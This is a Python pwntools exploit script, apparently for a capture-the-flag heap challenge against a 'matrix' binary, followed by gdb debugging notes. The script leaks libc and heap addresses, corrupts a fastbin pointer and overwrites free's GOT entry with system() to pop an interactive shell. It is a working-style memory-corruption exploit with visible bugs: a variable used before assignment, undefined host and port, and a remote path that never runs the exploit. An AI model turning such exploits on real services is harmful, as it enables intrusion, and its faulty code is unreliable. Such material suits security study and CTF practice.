from pwn import *



def floatToHex(f):

	return struct.unpack("<I",struct.pack("<f",f))[0]


def hexToFloat(h):

	return struct.unpack("<f",struct.pack("<I",h))[0]

def create(rows,cols):

	r.sendline("create %d %d"%(rows,cols))
	r.recvuntil("Enter command:")

def set(idd,row,col,value):

	r.sendline("set %d %d %d %s"%(idd,row,col,value))
	r.recvuntil("Enter command:")

def get(idd,row,col):

	r.sendline("get %d %d %d"%(idd,row,col))
	r.recvuntil(" = ")
	data = r.recvline()
	r.recvuntil("Enter command:")
	return data

def list():

	r.sendline("list")
	r.recvuntil("Enter Command:")

def prints(idd):

	r.sendline("print %d"%idd)
	r.recvuntil("Enter command:")


def destroy(idd):

	r.sendline("destroy %d"%idd)
	r.recvuntil("Enter command:")

def exploit(r):
	r.recvuntil("Enter command:")
	create(10,9)
	create(10,9)
	create(10,9)
	create(10,9)
	destroy(3)#3
	destroy(1)#2
	#print(hex(floatToHex(-1.49021653e-05)))
	#get 0 9 1
	#log.info("LEAK : " + hex(floatToHex(1.82259885e-40)[0]))
	leak = floatToHex(float(get(0,9,6)))
	libc = leak - 0x1ad450
	heapleak = floatToHex(float(get(0,9,4)))
	log.info("[+] leak : " + hex(leak))
	log.info("[+] libc base : " + hex(libc))
	log.info("[+] heap leak : " + hex(heapleak))
	#overwrite fastbin FD (fastbin corruption)
	destptr = heapleak - 0x198
	set(0,9,2,str(hexToFloat(destptr)))
	create(1,3) # 1	
	set(1,0,0,str(hexToFloat(10)))
	set(1,0,1,str(hexToFloat(9))) 
	set(1,0,2,str(hexToFloat(freegot))) #depater

	freegot = 0x0804b014
	syst = libc + 0x40310
	sh = libc + 0x162d4c
	set(0,0,0,str(hexToFloat(syst)))
	set(1,0,2,str(hexToFloat(sh)))
	 		
	r.interactive()

if __name__ == '__main__':

	if(len(sys.argv) > 2):

		r = remote(host,port)

	else:
		binary = os.getcwd() + '/matrix'
		r = process(binary)
		print(util.proc.pidof(r))
		pause()
		exploit(r)


'''
create 10 9

gdb-peda$ x/10x &matrices
0x555555756040 <matrices>:	0x0000555555759270	0x0000000000000000


gdb-peda$ x/100x 0x0000555555759270

gdb-peda$ x/x 0x555555759400-8
0x5555557593f8:	0x000000000001fc11


0x5555557593f8:	0x000000000001fc11
gdb-peda$ p/x 0x5555557593f8 - 0x555555759290
$1 = 0x168

gdb-peda$ p/d 0x168 / 4
$3 = 90
gdb-peda$ c

c

get 0 9 0




'''
